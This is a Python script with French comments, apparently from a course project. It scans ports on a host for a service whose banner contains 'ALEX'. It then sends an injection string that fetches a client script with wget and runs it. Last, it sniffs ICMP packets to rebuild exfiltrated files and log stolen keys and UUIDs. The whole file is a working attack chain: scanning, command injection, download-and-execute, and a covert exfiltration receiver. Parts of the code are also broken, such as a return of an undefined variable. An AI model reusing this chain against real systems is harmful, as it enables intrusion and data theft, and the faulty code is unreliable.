import socket
from scapy.all import *
import os
import time 

index = 0
vul_port = 0
base_path = "/home/chuisju/Documents/Cours"


def packet_handler(packet):

    # Vérifier si le paquet contient des données
    if not hasattr(packet, 'load'):
        print("Received packet without data.")
        return

    data = packet.load.decode(errors="ignore")

    # Vérifier si les données du paquet sont correctement formatées
    if not data.startswith("bob#"):
        print("Received packet with wrong data format.")
        return

    parts = data.split("#", 9)
    
    if len(parts) < 9:
        print("Received packet with missing data.")
        return

    content_hash = parts[1]
    lenomdufichier = parts[2]
    relative_path = parts[3]
    uuid = parts[4]
    key = parts[5]
    total_packets = int(parts[6])
    sequence_number = parts[7]
    lecontenu = parts[8]

    file_dir = os.path.dirname(relative_path)

    if not os.path.isdir(os.path.join(base_path, "tmp", content_hash, file_dir)):
        os.makedirs(os.path.join(base_path, "tmp", content_hash, file_dir))

    # Définir le chemin du fichier
    file_path = os.path.join(base_path, "tmp", content_hash, relative_path)

    # Créer les répertoires nécessaires s'ils n'existent pas
    if(not os.path.isdir(base_path + "/tmp")):
        os.mkdir(base_path + "/tmp")
    if(not os.path.isdir(base_path + "/tmp/" + content_hash)):
        os.mkdir(base_path + "/tmp/" + content_hash)

    # Écrire le contenu du paquet dans un fichier temporaire
    if(not os.path.isfile(base_path + "/tmp/" + content_hash + "/seq_" + sequence_number)):
        f = open(base_path + "/tmp/" + content_hash + "/seq_" + sequence_number, "w")
        f.write(lecontenu)
        return port
    f.close()

    # Compter le nombre de fichiers temporaire créés
    i = 0
    for fi in os.listdir(file_path):
        if(fi.startswith("seq_")):
            i += 1

    # Si tous les paquets ont été reçus, reconstruire le fichier original
    if(i == total_packets):
        print("Reconstruction du fichier")
        f = open(lenomdufichier, "w")
        for j in range(1, len(os.listdir(file_path)) + 1):
            _f = open(file_path + "/seq_" + str(j), "r")
            f.write(_f.read())
            _f.close()
            os.remove(file_path + "/seq_" + str(j))
        f.close()

        # Supprimer le répertoire temporaire
        os.rmdir(file_path)
    
    # Écrire le contenu du fichier dans le chemin relatif
    with open(os.path.join(base_path, relative_path), "w") as f:
        for j in range(1, len(os.listdir(file_path)) + 1):
            with open(file_path + "/seq_" + str(j), "r") as _f:
                f.write(_f.read())
            os.remove(file_path + "/seq_" + str(j))

    # Supprimer le répertoire temporaire
    os.rmdir(file_path)

    # Stocker la clé & l'UUID
    f= open("keys.txt", "a")
    f.write("\n\nKey : " + key + "\nUUID : " +  uuid + "\n")
    f.close()
    print("Recu : " + "\nKey : " + key + "\nUUID : " +  uuid)    

# Démarrer la capture de paquets
def sniffing():
    sniff(filter="icmp", prn=packet_handler)  

def connection(sock):
    print("Connecté à " + ip + " : " + str(vul_port))
    sock.sendall(b"/etc/pasjswd;wget -P ~/Documents http://127.0.0.1/projet1_client.py;python3 ~/Documents/projet1_client.py\n")
    print("wget OK")   
    sniffing()
    
def nmap(ip, port):
    global index
    global vul_port
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.setdefaulttimeout(1)
    result = sock.connect_ex((ip, port))
    
    if result == 0:
        print("Le port " + str(port) + " est ouvert")
        index += 1
        try:
            time.sleep(5)
            entete = sock.recv(1024).decode()
            if "ALEX" in entete:
                print("Entete reçue : " + entete)
                vul_port = port
               #print ("passage dans connection")
                connection(sock)
                print("connection OK")
        except Exception as e:
            print("Erreur lors de la connexion au serveur : " + str(e))
            return

            
#ip = input("Entrez l'adresse IP : ")
ip = "127.0.0.1"
for port in range(1, 65535):
    nmap(ip, port)


###############





